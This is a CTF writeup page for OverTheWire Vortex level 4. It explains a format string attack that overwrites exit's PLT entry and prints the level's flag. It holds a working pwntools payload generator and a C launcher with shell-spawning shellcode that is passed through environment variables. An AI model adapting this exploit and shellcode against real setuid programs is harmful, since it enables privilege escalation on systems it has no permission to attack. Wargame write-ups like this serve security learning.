<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=c4fe2f8b85b5cd33f4a88c9b430b87ece1dd468c">
    
<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- remove the cache headers -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>vortex4 | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="vortex4" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex04.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex04.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="vortex4" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"vortex4","url":"http://localhost:4000/CTF_writeups/overthewire/vortex/vortex04.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p>In this challenge, we had a format string attack.</p>

<p><img src="/CTF_writeups/overthewire/vortex/images/level4_1.png" alt="image" /></p>

<p>Here, we needed to manipulate the stack to find where our stored memory is. We used <code class="language-plaintext highlighter-rouge">$</code> inside format strings to navigate through the stack.</p>

<p>I wrote a simple solution, as shown above, that writes each byte to the memory of the <code class="language-plaintext highlighter-rouge">exit_plt_address</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">exit_plt_address</code> is <code class="language-plaintext highlighter-rouge">0x804c008</code>, and the next addresses are: <code class="language-plaintext highlighter-rouge">0x804c009</code>, <code class="language-plaintext highlighter-rouge">0x804c00a</code>, <code class="language-plaintext highlighter-rouge">0x804c00b</code>, which all contain characters, causing the print to stop when using Python.</p>

<p><img src="/CTF_writeups/overthewire/vortex/images/level4_2.png" alt="image" /></p>

<p>So, we needed to insert 3 bytes into the first address and 1 byte into the fourth address. This results in a long string being printed.</p>

<p>I wrote this C code to run <code class="language-plaintext highlighter-rouge">/vortex/vortex4</code> with the payload (<code class="language-plaintext highlighter-rouge">level4.c</code>).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="n">address_of_exit</span> <span class="o">=</span> <span class="mh">0x804c008</span>
<span class="c1"># address_of_exit = 0x804c050
</span><span class="n">address_of_shellcode</span> <span class="o">=</span> <span class="mh">0xffffdf9c</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_exit</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_exit</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'E'</span>
<span class="c1"># payload = b'AAAA' + b'BBBB' + b'E'
</span><span class="n">location</span> <span class="o">=</span> <span class="mi">121</span>

<span class="n">printed_chars</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># very special
</span><span class="n">shift</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">bytes_to_insert</span> <span class="o">=</span> <span class="p">(</span><span class="n">address_of_shellcode</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">bytes_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span>
<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x1000000</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">res</span><span class="si">:</span><span class="mi">010</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'p'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">location</span><span class="si">}</span><span class="s">$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">location</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">printed_chars</span> <span class="o">+=</span> <span class="n">res</span>
    
<span class="c1"># regular
</span><span class="n">shift</span> <span class="o">=</span> <span class="mi">24</span>
<span class="n">byte_to_insert</span> <span class="o">=</span> <span class="p">(</span><span class="n">address_of_shellcode</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">byte_to_insert</span> <span class="o">-</span> <span class="n">printed_chars</span>
<span class="k">if</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">while</span> <span class="n">res</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="mh">0x100</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">res</span><span class="si">:</span><span class="mi">03</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'p'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">location</span><span class="si">}</span><span class="s">$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">location</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>



<span class="c1"># for semi regular address it will work, however, we'll need to go on the address 0x804c00a, which gives us '\x0a', newline that screws everything up. yay :(
</span><span class="s">'''
address_of_exit = 0x804c008
# address_of_exit = 0x804c050
address_of_shellcode = 0xffffdf9c

payload = p32(address_of_exit) + p32(address_of_exit+1) + p32(address_of_exit+4)
# payload = b'AAAA' + b'BBBB' + b'DDDD' + b'EEE'
location = 122

printed_chars = len(payload)

# regular
shift = 0
byte_to_insert = (address_of_shellcode &gt;&gt; shift) &amp; 0xff
res = byte_to_insert - printed_chars
if res &lt;= 4:
    while res &lt;= 4:
        res += 0x100
payload += b'%' + f"{res:03}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

# special
shift = 8
bytes_to_insert = (address_of_shellcode &gt;&gt; shift) &amp; 0xffff
res = bytes_to_insert - printed_chars
if res &lt;= 4:
    while res &lt;= 4:
        res += 0x10000
payload += b'%' + f"{res:05}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

# regular
shift = 24
byte_to_insert = (address_of_shellcode &gt;&gt; shift) &amp; 0xff
res = byte_to_insert - printed_chars
if res &lt;= 4:
    while res &lt;= 4:
        res += 0x100
payload += b'%' + f"{res:03}".encode() + b'p'
payload += f'%{location}$p'.encode()
location += 1

printed_chars += res
    

sys.stdout.buffer.write(payload)
'''</span>




<span class="c1"># for regular address it will work, however, we'll need to go on the address 0x804c00a, which gives us '\x0a', newline that screws everything up. yay :(
</span><span class="s">'''

# address_of_exit = 0x804c008
address_of_exit = 0x804c050
address_of_shellcode = 0xffffdf9c

payload = p32(address_of_exit) + p32(address_of_exit+1) + p32(address_of_exit+2) + p32(address_of_exit+3) + b'EE'
# payload = b'AAAA' + b'BBBB' + b'CCCC' + b'DDDD' + b'EE'
location = 123

printed_chars = len(payload)
for shift in range(0, 32, 8):
    byte_to_insert = (address_of_shellcode &gt;&gt; shift) &amp; 0xff
    res = byte_to_insert - printed_chars
    if res &lt;= 4:
        while res &lt;= 4:
            res += 0x100
    payload += b'%' + f"{res:03}".encode() + b'p'
    payload += f'%{location}$n'.encode()
    location += 1

    printed_chars += res
    

sys.stdout.buffer.write(payload)
'''</span>

</code></pre></div></div>
<p>. You need to adjust the <code class="language-plaintext highlighter-rouge">address_of_exit</code> and <code class="language-plaintext highlighter-rouge">address_of_shellcode</code>, debug, and find them.</p>

<p><img src="/CTF_writeups/overthewire/vortex/images/level4_4.png" alt="image" />
<img src="/CTF_writeups/overthewire/vortex/images/level4_5.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">heo3EbnS9</code></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define PATH "/vortex/vortex4"
</span>
<span class="c1">// Shellcode to spawn a shell</span>
<span class="cp">#define SHELLCODE "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"
</span>
<span class="cp">#define PAYLOAD "\x08\xc0\x04\x08\x09\xc0\x04\x08\x0a\xc0\x04\x08\x0b\xc0\x04\x08\x45\x45\x25\x31\x33\x38\x70\x25\x31\x32\x33\x24\x6e\x25\x30\x36\x37\x70\x25\x31\x32\x34\x24\x6e\x25\x30\x33\x32\x70\x25\x31\x32\x35\x24\x6e\x25\x32\x35\x36\x70\x25\x31\x32\x36\x24\x6e"
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">""</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">SHELLCODE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>

    <span class="c1">// Execute the vulnerable program</span>
    <span class="n">execve</span><span class="p">(</span><span class="n">PATH</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>

    <span class="c1">// If execve fails, print an error message</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"execve"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>and just provide the payload inside, the regular payload will work.</p>

<p><img src="/CTF_writeups/overthewire/vortex/images/level4_3.png" alt="image" /></p>

      </section>
    </div>
  </body>
</html>
